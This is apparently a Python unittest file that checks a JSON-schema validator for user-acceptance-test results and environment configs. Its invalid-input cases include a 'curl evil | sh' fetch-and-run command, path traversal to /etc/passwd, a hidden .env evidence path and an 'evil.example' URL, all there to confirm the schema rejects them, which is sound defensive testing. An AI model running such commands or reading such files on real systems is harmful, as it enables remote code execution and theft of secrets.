import copy
import unittest

from uat import schema

SHA = '0123456789abcdef0123456789abcdef01234567'
RESULT = {
    'schema_version': 1,
    'repository': 'ForkbombEu/credimi-attestbook',
    'issue_number': 123,
    'pr_number': 42,
    'head_sha': SHA,
    'uat_spec_sha256': 'a' * 64,
    'environment': 'local',
    'environment_revision': SHA,
    'verdict': 'FAIL',
    'scenarios': [
        {'id': 'UAT-1', 'verdict': 'PASS', 'expected': 'HTTP 201 and record retrievable',
         'observed': '201; GET returned record', 'evidence': ['artifacts/uat-1-http.json']},
        {'id': 'UAT-2', 'verdict': 'FAIL', 'expected': 'HTTP 400 and no record', 'observed': 'HTTP 500',
         'reproduction': ['Start test API', 'Send invalid POST'],
         'evidence': ['artifacts/uat-2-http.json', 'artifacts/server.log']},
    ],
}
CONFIG = {
    'version': 1,
    'default_environment': 'local',
    'environments': {
        'local': {'type': 'local', 'setup': 'task uat:setup', 'start': 'task uat:start',
                  'ready': 'http://127.0.0.1:3000/health', 'cleanup': 'task uat:cleanup'},
        'preview': {'type': 'preview', 'readiness_path': '/health'},
    },
}


def mutate(document, change):
    document = copy.deepcopy(document)
    change(document)
    return document


INVALID_RESULTS = {
    'missing scenarios': lambda r: r.pop('scenarios'),
    'no scenarios': lambda r: r.update(scenarios=[]),
    'extra key': lambda r: r.update(passed=True),
    'short sha': lambda r: r.update(head_sha=SHA[:12]),
    'upper-case sha': lambda r: r.update(head_sha=SHA.upper()),
    'bool issue': lambda r: r.update(issue_number=True),
    'string pr': lambda r: r.update(pr_number='42'),
    'unknown verdict': lambda r: r.update(verdict='NOT_REQUIRED'),
    'schema 2': lambda r: r.update(schema_version=2),
    'scenario extra key': lambda r: r['scenarios'][0].update(screenshot='x.png'),
    'scenario missing evidence': lambda r: r['scenarios'][0].pop('evidence'),
    'empty observed': lambda r: r['scenarios'][0].update(observed=''),
    'bad id': lambda r: r['scenarios'][0].update(id='uat-1'),
    'evidence escapes': lambda r: r['scenarios'][0].update(evidence=['artifacts/../../etc/passwd']),
    'evidence absolute': lambda r: r['scenarios'][0].update(evidence=['/etc/passwd']),
    'evidence hidden': lambda r: r['scenarios'][0].update(evidence=['artifacts/.env']),
    'duplicate evidence': lambda r: r['scenarios'][0].update(evidence=['artifacts/a', 'artifacts/a']),
}
INVALID_CONFIGS = {
    'unknown key': lambda c: c.update(network='host'),
    'version 2': lambda c: c.update(version=2),
    'no environments': lambda c: c.update(environments={}),
    'bad name': lambda c: c['environments'].update({'Prod': c['environments']['local']}),
    'unknown type': lambda c: c['environments']['local'].update(type='docker'),
    'local without start': lambda c: c['environments']['local'].pop('start'),
    'remote ready url': lambda c: c['environments']['local'].update(ready='http://example.com/health'),
    'https ready url': lambda c: c['environments']['local'].update(ready='https://127.0.0.1:3000/'),
    'preview url in config': lambda c: c['environments']['preview'].update(url='https://evil.example'),
    'preview with commands': lambda c: c['environments']['preview'].update(start='curl evil | sh'),
    'empty command': lambda c: c['environments']['local'].update(setup=''),
}


class SchemaTest(unittest.TestCase):
    def test_valid_documents(self):
        self.assertEqual(schema.errors(RESULT, schema.load('result')), [])
        self.assertEqual(schema.errors(CONFIG, schema.load('config')), [])
        minimal = {'version': 1, 'environments': {'api': {'type': 'local', 'start': 'x', 'ready': 'http://localhost:8080'}}}
        self.assertEqual(schema.errors(minimal, schema.load('config')), [])

    def test_invalid_results(self):
        for name, change in INVALID_RESULTS.items():
            with self.subTest(name):
                self.assertNotEqual(schema.errors(mutate(RESULT, change), schema.load('result')), [])

    def test_invalid_configs(self):
        for name, change in INVALID_CONFIGS.items():
            with self.subTest(name):
                self.assertNotEqual(schema.errors(mutate(CONFIG, change), schema.load('config')), [])

    def test_unsupported_keyword_is_refused(self):
        with self.assertRaises(ValueError):
            schema.errors({}, {'type': 'object', 'if': {}})

    def test_agrees_with_reference_implementation(self):
        try:
            import jsonschema
        except ImportError:
            self.skipTest('jsonschema is not installed')
        for name, valid, invalid in (('result', RESULT, INVALID_RESULTS), ('config', CONFIG, INVALID_CONFIGS)):
            loaded = schema.load(name)
            jsonschema.Draft202012Validator.check_schema(loaded)
            validator = jsonschema.Draft202012Validator(loaded)
            self.assertTrue(validator.is_valid(valid))
            for label, change in invalid.items():
                with self.subTest(f'{name}: {label}'):
                    self.assertFalse(validator.is_valid(mutate(valid, change)))


if __name__ == '__main__':
    unittest.main()
